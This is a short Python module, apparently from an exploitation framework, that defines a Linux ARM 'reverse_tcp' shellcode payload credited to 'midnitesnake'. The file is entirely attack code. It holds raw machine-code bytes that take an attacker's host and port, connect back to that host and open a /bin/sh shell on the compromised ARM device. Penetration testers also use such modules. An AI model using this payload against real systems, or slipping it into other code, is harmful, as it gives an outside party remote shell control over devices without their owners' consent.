from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "midnitesnake"
    Shellcode.info["name"] = "LinuxARM - reverse_tcp shellcode"
    Shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-821.php",
    ]

    def __init__(self, **kwargs): 
        Shellcode.info["payload"] = [
            r"\x01\x10\x8F\xE2\x11\xFF\x2F\xE1"
            r"\x02\x20\x01\x21\x92\x1a\x0f\x02"
            r"\x19\x37\x01\xdf\x06\x1c\x08\xa1"
            r"\x10\x22\x02\x37\x01\xdf\x3f\x27"
            r"\x02\x21\x30\x1c\x01\xdf\x01\x39\xfb\xd5"
            r"\x05\xa0\x92\x1a\x05\xb4\x69\x46"
            r"\x0b\x27\x01\xdf\xc0\x46\x02\x00"
            + kwargs["lport"] +
            r"\x13\x37"
            + kwargs["host"] +
            r"\x2f\x62\x69\x6e\x2f\x73\x68"  

        ]
